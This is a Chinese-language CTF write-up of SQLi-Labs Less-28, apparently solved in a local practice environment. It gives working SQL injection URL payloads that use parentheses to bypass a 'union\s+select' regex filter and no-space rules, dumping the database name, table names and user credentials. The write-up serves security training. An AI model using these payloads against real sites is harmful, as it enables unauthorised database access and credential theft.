【SQLi-Labs】Less-28 正则拦截与括号绕过 Writeup

操作者：何芊宏 | 操作日期：2026.10.27 | 分类：CTF | 标签：SQLi-Labs, Web, SQL注入, 绕过过滤, 联合查询

1. 题目信息

  • 平台：SQLi-Labs (本地 phpStudy 环境)
  • 分类：Web - SQL注入
  • 题目名称：Less-28 (GET - Trick with SELECT & UNION)
  • 提示：过滤了带空格的 union select 组合、空格及注释符，单引号加括号闭合。

2. 核心原理与绕过策略

本关卡的防御机制不同于前几关的“无脑拉黑关键字”，而是使用了精确的正则表达式：

  • 正则拦截：匹配 union\s+select（即当 union 和 select 之间存在空格、换行等空白符时才会被拦截）。
  • 空格与注释符被封杀：传统的空格和 #、-- 无法使用。
  • 闭合方式：后台 SQL 为 id=('$id')，需使用 ') 闭合。

绕过策略：

  • 括号代替空格：直接将 Payload 写成 union(select...)。词法解析器遇到括号会自动切断 Token，完美规避 union\s+select 的正则匹配。
  • 对称闭合：在 Payload 末尾使用 ||' 与后台原本的 ') LIMIT 0,1 缝合，形成合法的空字符串。

3. 操作步骤与解析

第一步：爆库名

输入 URL：?id=0')union(select(1),database(),3||'

回显现象：页面第 2 列回显 security。

第二步：爆表名

输入 URL：?id=0')union(select(1),group_concat(table_name),(3)from(information_schema.tables)where(table_schema=database())||'

回显现象：页面第 2 列回显 emails,referrers,uagents,users。

注：由于 from 后面不能有空格，使用 )from( 进行分隔。

第三步：直接脱库

输入 URL：?id=0')union(select(1),group_concat(username,0x3a,password),(3)from(users)where(1=1)||'

回显现象：成功爆出所有账号和密码，包含 admin:p@ssw0rd。

4. 踩坑记录与复盘

  • 对正则的逆向思维：针对 union\s+select 的正则，最好的绕过方式不是换空格，而是彻底不要空格。
  • 闭合符的精准匹配：必须用 ') 闭合，尾部必须用 ||' 缝合，任何符号的错位都会导致语法崩溃。

5. 知识点总结

  • 正则绕过：利用括号 () 阻断空白字符的匹配。
  • 词法边界：深刻理解标点符号在 SQL 解析中的切分作用。
